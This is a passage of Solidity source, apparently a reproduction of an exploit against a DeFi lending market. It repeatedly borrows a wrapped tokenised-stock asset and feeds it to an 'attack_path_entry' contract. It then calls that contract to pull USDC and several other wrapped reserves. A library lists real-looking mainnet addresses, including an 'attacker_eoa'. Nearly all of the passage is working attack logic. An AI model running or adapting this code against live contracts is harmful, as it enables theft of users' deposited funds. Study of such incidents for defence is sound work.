                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_37, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_38 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_38);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_38 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_38, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_39 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_39);
        }
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_39 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_39, 2, uint16(0), address(this));
        }
        {
            uint256 wGOOGLxTransferAmount_40 = 1414889025557658614;
            IERC20Like(Addresses.wGOOGLx).transfer(Addresses.attack_path_entry, wGOOGLxTransferAmount_40);
        }
    }

    function flashCallback36() internal {
        _strictCall(
            Addresses.attack_path_entry, abi.encodeWithSelector(bytes4(0xc1d5a727), uint256(1414889025557658614))
        );
        {
            uint256 a3eeeb3Faa6BorrowAmount_40 = 1414889025557658614;
            IContract_3EEEB3_FAA6(Addresses.A_3EEEB3_FAA6)
                .borrow(Addresses.wGOOGLx, a3eeeb3Faa6BorrowAmount_40, 2, uint16(0), address(this));
        }
        {
            uint256 redeemShares = 1414889025557658614;
            IwGOOGLx(Addresses.wGOOGLx).redeem(redeemShares, address(this), address(this));
        }
        {
            uint256 gOOGLxTransferAmount = 8489334153345952365;
            IERC20Like(Addresses.GOOGLx).transfer(Addresses.wGOOGLx, gOOGLxTransferAmount);
        }
        IERC20Like(Addresses.USDC).balanceOf(Addresses.eUSDC);
        _strictCall(
            Addresses.attack_path_entry,
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48),
                uint256(384215572188),
                uint256(0)
            )
        );
        IERC20Like(Addresses.wSPYx).balanceOf(Addresses.A_3B707B_7B5F);
        _strictCall(
            Addresses.attack_path_entry,
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000c88fcd8b874fdb3256e8b55b3decb8c24eab4c02),
                uint256(122196850288612833306),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wQQQx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_44CA9E);
        _strictCall(
            Addresses.attack_path_entry,
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000dbd9232fee15351068fe02f0683146e16d9f2cea),
                uint256(62969726160938091585),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wMSTRx).balanceOf(Addresses.A_854633_4EC0);
        _strictCall(
            Addresses.attack_path_entry,
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x000000000000000000000000266e5923f6118f8b340ca5a23ae7f71897361476),
                uint256(293123092617121394703),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wNVDAx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_706D86);
        _strictCall(
            Addresses.attack_path_entry,
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x00000000000000000000000093e62845c1dd5822ebc807ab71a5fb750decd15a),
                uint256(99854367795581762710),
                uint256(1)
            )
        );
        IERC20Like(Addresses.wTSLAx).balanceOf(Addresses.InitializableImmutableAdminUpgradeabilityProxy_E97B09);
        _strictCall(
            Addresses.attack_path_entry,
            abi.encodeWithSelector(
                bytes4(0x8259ef5f),
                uint256(0x00000000000000000000000043680abf18cf54898be84c6ef78237cfbd441883),
                uint256(37589277017463227843),
                uint256(1)
            )
        );
        {
            uint256 usdcApproveAllowance = 180000000000;
            IERC20Like(Addresses.USDC).approve(Addresses.Morpho, usdcApproveAllowance);
        }
    }

    function _acceptSetup() public {}

    function _strictCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant variableDebtwQQQx = 0x0C68a8B383F81653DF0c3f0dcEad0c77091315B9;
    address internal constant stableDebtwNVDAx = 0x0dFf8FE6A5fd6c1DC3293c20E650FA5CA5fE7685;
    address internal constant ewGOOGLx = 0x0eC96784aA6f47E456E0Ce4eB2a8B00F1A6C9b74;
    address internal constant wBTI = 0x14f37168AB9eAFCD94d5b142a00E6e9B261Bad48;
    address internal constant wGOOGLx = 0x1630F08370917E79df0B7572395a5e907508bBBc;
    address internal constant A_1F05C7_7167 = 0x1F05c70Db2fFa1B1BAc62b27e7678B765ebe7167;
    address internal constant wMSTRx = 0x266E5923F6118F8b340cA5a23AE7f71897361476;
    address internal constant variableDebtwNVDAx = 0x2b7a37f1669a4E616704d65f0ddC653347BA8901;
    address internal constant DefaultReserveInterestRateStrategy = 0x30D1bBa26326b5D0d1318F490F2F964701E0091c;
    address internal constant A_32A321_F990 = 0x32A321B8e05B56e7450DBa16B11e1739CFD6f990;
    address internal constant A_3410D5_4D9D = 0x3410d58030CBe273f1D6B8fCFa2cF1D6f8224d9D;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_3885D7 =
        0x3885d7FE5745c2A94CaBA576c84463a3fbDe72Ba;
    address internal constant A_3B707B_7B5F = 0x3B707b904841579d81e0e5bd71e65DaA269E7B5F;
    address internal constant A_3EEEB3_FAA6 = 0x3EEeB3cd20f844a578807fc457388Ceb9A67fAa6;
    address internal constant variableDebtwGOOGLx = 0x41D25b8918d3dc4De807D56FD43A82854036714b;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant wTSLAx = 0x43680aBF18cf54898Be84C6eF78237CFBD441883;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_44CA9E =
        0x44cA9E30b96fF05D5E4AA44A295F15954E47cA1b;
    address internal constant stableDebtUSDC = 0x49C700c3F79Cc405cc3cCec382B2Fd11eCFdB826;
    address internal constant A_4C2C9D_4CE2 = 0x4C2c9DF4559d80E0a7aA3C7F281704A7992f4CE2;
    address internal constant STABLE_DEBT_TOKEN_IMPL = 0x4f8F2946A09a7137EA72f7f79261Bf8f77F0d5e0;
    address internal constant stableDebtwGOOGLx = 0x5229548877C3126a1Ac40f2A1C05e50376570733;
    address internal constant A_56B595_2DA9 = 0x56B5958f237880D59E85D9EBCC0A03208B742Da9;
    address internal constant stableDebtwSPYx = 0x575beE50e591a493DC2D5f4D8fBf2741873Db06A;
    address internal constant attacker_eoa = 0x58428161bB55c14A413945f06cbDeC157F411C76;
    address internal constant variableDebtwTSLAx = 0x5e26CAbe36Ed4Ae82f60e3c2c9dF6c7df63F3569;
    address internal constant variableDebtUSDC = 0x6D35b645a83F86B79D093DE3e8aC41e0df5E03B6;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_706D86 =
        0x706D86fb27017df76c4777Ad987142838141eFf3;
    address internal constant stableDebtwMSTRx = 0x7f59Ef2f0694A60226CD7bC2131C3B293a478874;
    address internal constant stableDebtwQQQx = 0x81B159d2e8Ca5c0BCf16de117D035b678A6Af7Cb;
    address internal constant A_854633_4EC0 = 0x854633708BCC6dFA0650CBf557B6ceB383564ec0;
    address internal constant A_869C39_CE59 = 0x869c3981db4F89C65BdB997021bD07C1a962CE59;
    address internal constant TSLAx = 0x8aD3c73F833d3F9A523aB01476625F269aEB7Cf0;
    address internal constant attack_path_entry = 0x8b2Af1a9885E4755d22ce4A49f7A525a33f1C9e4;
    address internal constant A_9029BC_9818 = 0x9029bC7B5c9d74eD26Eaa6896062342d7bd19818;
    address internal constant SPYx = 0x90A2a4c76b5D8c0bc892A69EA28Aa775a8f2dD48;
    address internal constant wNVDAx = 0x93E62845C1DD5822EbC807ab71A5Fb750DecD15A;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant attack_child = 0xA65a2F97044f4398200E02Ff9C88351cb7cC1500;
    address internal constant eUSDC = 0xa66C648965781a67cae928fECdD413b32E081E38;
    address internal constant QQQx = 0xa753A7395cAe905Cd615Da0B82A53E0560f250af;
    address internal constant MSTRx = 0xAE2f842EF90C0d5213259Ab82639D5BBF649b08E;
    address internal constant A_AFA37B_F8EE = 0xAfA37bbF68d33Bcb35A55Ea01E299e2d2DE0f8Ee;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant NVDAx = 0xc845b2894dBddd03858fd2D643B4eF725fE0849d;
    address internal constant wSPYx = 0xc88FcD8B874fDb3256E8B55b3decB8c24EAb4c02;
    address internal constant A_CB542F_39E6 = 0xcB542FD60fB03C9De4242566e323ec3A706139e6;
    address internal constant BTI = 0xd865Ce1B07540b5edE20e8298f48da69770Fe22e;
    address internal constant wQQQx = 0xdbD9232fee15351068Fe02F0683146e16D9f2cEa;
    address internal constant variableDebtwSPYx = 0xdD51785d7016d452B7C28d51b2Ce260A0f64f3E1;
    address internal constant variableDebtwMSTRx = 0xe8add97F1f6900F419deFAaa629fE13BF49d8ae4;
    address internal constant GOOGLx = 0xe92f673Ca36C5E2Efd2DE7628f815f84807e803F;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_E97B09 =
        0xE97b0920b5d4e358E4564FBB4d40aACAd9cf3392;
    address internal constant A_FC5EFD_9F6B = 0xFc5eFD77A45C89471386f6FaBE2c6e9940189f6B;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_3EEEB3_FAA6 {
    function borrow(address, uint256, uint256, uint16, address) external;
    function supply(address, uint256, address, uint16) external;
}

interface IwGOOGLx {
    function redeem(uint256, address, address) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
